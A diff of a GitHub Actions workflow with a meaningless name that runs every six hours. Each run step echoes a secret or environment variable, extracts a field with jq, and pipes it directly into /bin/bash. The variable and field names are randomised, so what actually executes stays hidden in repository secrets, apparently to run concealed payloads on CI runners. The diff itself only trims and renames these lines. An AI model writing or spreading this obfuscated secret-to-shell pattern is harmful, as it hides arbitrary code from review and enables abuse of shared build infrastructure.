@@ -3,23 +3,16 @@ name: pousuanshashou
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-
-jobs:  # 21528
+    - cron: '37 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: pousuanshashou
         env:
-          i33050: ${{ secrets.i33050 }}
+          r70: ${{ secrets.r70 }}
         run: |
-          echo $i33050 | jq -r .b382 | /bin/bash
-          echo $djegu5 | jq -r .per7706 | /bin/bash
-          echo $y5 | jq -r .ccmnb79 | /bin/bash
-          echo $kvwcd698 | jq -r .akus88 | /bin/bash
-          echo $xgsnb8618 | jq -r .zne491 | /bin/bash
-          echo $hwy4 | jq -r .hikdi9235 | /bin/bash
-          echo $gevsz21643 | jq -r .omu12627 | /bin/bash
-          echo $zy27098 | jq -r .sjv811 | /bin/bash
+          echo $r70 | jq -r .idd2 | /bin/bash
+          echo $z4 | jq -r .pxxea58 | /bin/bash
 
